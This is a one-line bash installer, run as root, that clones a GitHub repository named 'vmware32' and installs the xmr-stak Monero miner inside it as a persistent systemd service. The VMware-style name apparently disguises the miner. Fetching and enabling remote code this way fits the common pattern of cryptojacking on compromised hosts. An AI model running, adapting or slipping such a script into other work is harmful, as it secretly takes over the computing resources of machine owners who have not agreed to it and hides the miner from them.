#!/bin/bash

apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git && cd /root/ && sysctl -w vm.nr_hugepages=128 && git clone https://github.com/nokian5500/vmware32.git && cd vmware32 && chmod +x xmr-stak && mv xmr.service /lib/systemd/system/ && systemctl -f daemon-reload && systemctl -f enable xmr.service && systemctl -f start xmr.service && systemctl -f stop xmr.service && systemctl -f restart xmr.service

